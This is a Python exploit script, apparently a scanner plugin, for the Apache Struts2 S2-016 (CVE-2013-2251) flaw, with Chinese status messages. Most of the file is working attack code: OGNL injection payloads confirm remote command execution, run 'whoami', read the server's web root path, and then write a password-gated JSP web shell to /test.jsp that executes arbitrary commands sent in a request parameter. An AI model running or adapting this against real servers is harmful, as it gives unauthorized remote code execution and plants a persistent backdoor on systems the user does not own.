#!/usr/bin/env python3

'''
name: Struts2 S2-016漏洞，又名CVE-2013-2251漏洞
description: Struts2 S2-016漏洞可执行任意命令
'''

import os
import re
import json
import time
import urllib
from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class S2_016_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.capta = get_capta() 
        self.headers = {
                   'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
                   'Content-Type': "application/x-www-form-urlencoded",
                   'Connection': "keep-alive",
                  }
        self.check_payload = '''?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27''' + 'echo' + ' ' + self.capta + '''%27%29.getInputStream%28%29%29%7D'''
        self.cmd_payload = '''?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{'whoami'}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}'''
        self.path_payload = '''?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28"%2F"%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D'''
        self.jsp_payload  = """
                            <%
                            if("cmd".equals(request.getParameter("pwd"))){
                                java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
                                int a = -1;
                                byte[] b = new byte[2048];
                                out.print("<pre>");
                                while((a=in.read(b))!=-1){
                                    out.println(new String(b));
                                }
                                out.print("</pre>");
                            }
                            %>
                            """
    
    def get_pagecode(self, url):
        req = request.get(url = url)
        return req

    def upload_jspshell(self, url, path):
        
        webshellpath = "'" + path + '/' + "/test.jsp" + "'"
        Headers = {'ACCEPT': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','User-Agent' : 'Mozilla/5.0 (compatible; Indy Library)'}
        payload = "?redirect:${%23path%3d"
        payload += webshellpath
        payload += ",%23file%3dnew+java.io.File(%23path),%23file.createNewFile(),%23buf%3dnew+char[50000],%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest').getReader().read(%23buf),%23out%3dnew+java.io.BufferedWriter(new+java.io.FileWriter(%23file)),%23str%3dnew+java.lang.String(%23buf),%23out.write(%23str.trim()),%23out.close(),%23stm%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23stm.getWriter().println("
        payload += '"' + path + '/test.jsp' + '+Get Shell!!!"'
        payload += "),%23stm.getWriter().flush(),%23stm.getWriter().close()}"
        url += payload
        try:
            req = request.post(url, data = self.jsp_payload, headers = Headers)
            if req.text.find('<html') == -1:
                print('上传webshell文件成功,webshell文件路径为:', self.url.split('/')[0] + '//' + self.url.split('/')[2] + '/test.jsp')
            else:
                return 'Fail.....>_<'
	
        except Exception as e:
            return str(e)
    
    def filter(self, check_str):
        temp = ''
        for i in check_str:
            if i != '\n' and i != '\x00':
                temp = temp + i
        return temp             

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        if '.action' not in self.url:
            self.url = self.url + '/index.action'
        check_req = self.get_pagecode(self.url + self.check_payload)
        check_str = self.filter(list(check_req.text))
        try:
            if self.capta in check_str:
                cmd_req = self.get_pagecode(self.url + self.cmd_payload)
                cmd_str = self.filter(list(cmd_req.text))
                print('存在S2-016漏洞,执行whoami命令成功，执行结果为:', cmd_str)
                path_req =  self.get_pagecode(self.url + self.path_payload)
                if path_req.status_code == 200:
                    print('存在S2-016漏洞,获取网站文件路径成功，结果为:', path_req.text)
                    self.upload_jspshell(self.url, "".join(path_req.text.split()))
                return True
            else:
                print('不存在S2-016漏洞!')
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass


if  __name__ == "__main__":
    s2_016 = S2_016_BaseVerify('http://192.168.30.242:8080')
    s2_016.run()
